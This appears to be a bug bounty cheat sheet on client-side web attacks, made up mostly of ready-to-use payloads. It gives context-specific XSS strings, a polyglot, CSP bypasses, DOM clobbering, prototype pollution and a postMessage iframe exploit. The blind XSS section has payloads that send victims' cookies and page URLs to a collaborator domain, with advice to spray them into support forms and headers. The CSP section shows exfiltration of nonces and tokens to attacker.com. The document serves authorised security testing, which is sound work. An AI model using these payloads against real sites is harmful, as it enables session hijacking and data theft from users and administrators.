---
title: "XSS, DOM, postMessage & CSP Bypasses"
description: "Context-aware cross-site scripting payloads, DOM clobbering, prototype pollution, postMessage flaws, and CSP bypass techniques"
tags:
  - Bug Bounty
  - XSS
  - CSP
  - DOM
  - Client-Side
---

# XSS, DOM, postMessage & CSP Bypasses

---

## 1. Context-Aware XSS Payloads

Always identify the **reflection context** first: HTML body, attribute, `href`/`src`, JS string, JS template literal, DOM sink, or inside a JSON response rendered by client JS.

| Context | Payload |
| :--- | :--- |
| **HTML body** | `<svg onload=alert(1)>` &nbsp;/&nbsp; `<img src=x onerror=alert(1)>` |
| **Double-quoted attribute** | `" onmouseover="alert(1)` &nbsp;/&nbsp; `" autofocus onfocus="alert(1)` |
| **Single-quoted attribute** | `' onmouseover='alert(1)` &nbsp;/&nbsp; `' autofocus onfocus='alert(1)` |
| **Unquoted attribute** | `onmouseover=alert(1)` &nbsp;/&nbsp; `autofocus onfocus=alert(1)` |
| **Inside `<script>` string** | `';alert(1);//` &nbsp;/&nbsp; `\';alert(1);//` &nbsp;/&nbsp; `</script><img src=x onerror=alert(1)>` |
| **Template literal** | `` ${alert(1)} `` &nbsp;/&nbsp; `` `+alert(1)+` `` |
| **`href` / `src`** | `javascript:alert(1)` &nbsp;/&nbsp; `data:text/html,<script>alert(1)</script>` |
| **Inside `<title>`** | `</title><svg onload=alert(1)>` |
| **Inside JSON API** | `{"name":"</script><svg onload=alert(1)>"}` (if rendered via `innerHTML`) |
| **Markdown / rich text** | `[x](javascript:alert(1))` &nbsp;/&nbsp; `![x]("onerror="alert(1))` |

```javascript
// Polyglot — works across many contexts at once
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Universal WAF-bypass single-payload attempt
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## 2. Blind XSS (Stored in Internal Panels)

Blind XSS fires in **admin dashboards, support ticket panels, log viewers, and CRM tools** — often the highest-impact XSS class because it hits privileged users.

```bash
# 1. Fire a payload at every user-input field
"><script src=https://<COLLABORATOR_DOMAIN>/xss.js></script>
'"><img src=x onerror=fetch('https://<COLLABORATOR_DOMAIN>/xss?c='+document.cookie)>
"><script>new Image().src='https://<COLLABORATOR_DOMAIN>/x?u='+encodeURIComponent(location)+'&c='+document.cookie</script>
# 2. High-yield blind XSS fields (fill these EVERYWHERE)
# - Contact Us / Support forms (name, message, subject, company, phone, website)
# - User-Agent, Referer, X-Forwarded-For headers (logged and rendered in panels)
# - File names, EXIF metadata, User profile fields (first/last/company/address)
# - Order notes, review comments, coupon codes, invite messages
# - Error messages / stack traces (force a 500 and inject into the URL path!)
# 3. Automated blind XSS hunting with XSS Hunter / ezXSS
# Host your own ezXSS instance, then integrate payloads into your fuzzing wordlists.
```

---

## 3. CSP Bypass Techniques

```text
# 1. Check the policy — look for: unsafe-inline, unsafe-eval, wildcards, missing object-src,
# missing base-uri, and the presence of a JSONP endpoint or a whitelisted CDN.
# 2. JSONP endpoint on whitelisted domain -> execute arbitrary callback
<script src="https://whitelisted.com/api/jsonp?callback=alert(1)//"></script>
# 3. Angular/AngularJS library on whitelisted CDN (if angular is whitelisted)
<div ng-app ng-csp><div ng-click="$event.view.alert(1)">click</div></div>
{{constructor.constructor('alert(1)')()}}
# 4. Whitelisted CDN with a vulnerable JS library (use "script gadgets")
<script src="https://cdn.whitelisted.com/jquery.min.js"></script>
<script src="https://cdn.whitelisted.com/angular.min.js"></script>
# 5. base-uri missing -> inject <base href="https://attacker.com/"> to hijack relative scripts
<base href="https://attacker.com/">
# 6. Nonce stealing / reuse
- Nonce is static across requests -> reuse it
- Nonce is leaked in the HTML (always is) -> if you can inject markup, read it via CSS/attribute selectors
<style>@import 'https://attacker.com/?c='...</style> (CSS exfiltration of nonce/CSRF token)
# 7. Injection into a file that is itself whitelisted (upload a .js as an image)
# 8. Service Worker / iframe srcdoc / worker-src abuse
# 9. Trusted Types bypasses via DOM XSS sinks in older frameworks
# 10. "strict-dynamic" + a whitelisted script that itself has a DOM XSS gadget
```

---

## 4. DOM Clobbering, Prototype Pollution & postMessage

```html
<!-- DOM CLOBBERING: create global variables via id/name attributes to break JS logic -->
<form id="config">
  <input name="apiEndpoint" value="https://attacker.com/">
  <input id="isAdmin" value="true">
</form>
<a id="defaultAvatar"></a>
<!-- If JS does: if (window.config.apiEndpoint) { fetch(window.config.apiEndpoint) } -->
<!-- Your attacker-controlled endpoint is used instead! -->

<!-- Clobber document properties to bypass sanitizers (DOMPurify < 2.0.17 style bugs) -->
<form id="x"><input name="attributes"></form>
```

```javascript
// CLIENT-SIDE PROTOTYPE POLLUTION
// Sources: URL parsers, JSON merge, lodash.merge, jQuery $.extend(true,...), object spread
// Payload in query string, hash, or JSON body:
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
?__proto__.polluted=yes
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

// Confirm in devtools console:
Object.prototype.isAdmin // -> true
({}).isAdmin // -> true

// Escalate pollution -> XSS via gadget chains (look for these sinks in bundled JS):
// innerHTML, script.src, srcdoc, document.write, eval, setTimeout(string),
// jQuery $.globalEval, Angular template compilation, DOMPurify config objects,
// React's dangerouslySetInnerHTML, Vue's v-html
```

```javascript
// POSTMESSAGE VULNERABILITY (missing origin check)
// 1. Find listeners: search all JS bundles for addEventListener('message'
// 2. Vulnerable code looks like:
window.addEventListener('message', (e) => {
    document.getElementById('out').innerHTML = e.data; // XSS!
});

// 3. Exploit from attacker page inside an iframe:
<iframe src="https://<DOMAIN>/widget" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>

// 4. Also test: postMessage with "*" targetOrigin leaking sensitive data back to ANY origin
// and e.origin checks done with .includes() / .endsWith() instead of ===
```